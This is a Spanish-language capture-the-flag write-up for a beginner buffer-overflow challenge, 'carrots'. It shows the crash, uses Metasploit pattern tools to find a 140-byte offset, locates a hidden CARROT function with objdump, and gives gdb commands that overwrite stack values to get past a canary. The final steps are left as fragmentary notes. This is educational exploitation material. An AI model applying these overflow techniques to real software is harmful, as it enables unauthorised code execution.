## **Enunciado**

Points: 300   
Country: Mexico   
Attatchment: https://mega.nz/#!twM1nYCA!qXDWql7ER6gLYj6eaT7iG-12sFdH3ozePk0VDl_xLwk   
Description: We all know that rabbits' favorite food is carrots. Help the rabbits to eat their favorite food today and be careful with the birds...good luck!   

## **Solución**

Se trata del clásico buffer overflow que peta cuando le metes más caracteres de los debidos:

```
./carrots 

        .--``..---.                
         .````--:ohdmNms/`         
          -:/+++/-.:smNd+          
       ```..--:ohmNNdhh.           
     `-. `.``.-+sosshd.         :. 
   -os--/sosdmmNNMMNy         .+// 
  :h+.+hNNMMMNNNMMNm/      `/yNN.` 
 .do/oNNMMMMMmohs+:`    .+hNMMMM-` 
 `yohNhNNNMh-           dosNMMMmo- 
  -mN+hMMMy             .smNMNdd/+`
   yN.hMMh               +NMMNmhds:
   +N//m+                 .osshyho 
  ..smhh                           
   ::oNmy-                         
      .//yhs/:`                    
          :ymNN/                   
         .-+shdho.                 
             `.--..` '''   

 Where is my carrot?
 > AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaaaa
Segmentation fault
```

Vamos a crear un patrón de caracteres para averiguar el offset con metasploit:

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 150
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
```

Lo metemos en gdb y nos da una dirección que se corresponde con una parte del patrón anteior. Esta dirección se la pasamos a metaspoit otra vez y nos da el offset:

```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 150 -q 0x37654136
[*] Exact match at offset 140
```



objdump -x carrots | grep CARR
08049570 g     F .text	0000021a              _Z6CARROTv


br *0x804981c

set {int}0xbffff334=0x42495244
set {int}0xbffff338=0x00000000
set {int}0xbffff33c=0x08049570
evitar canary
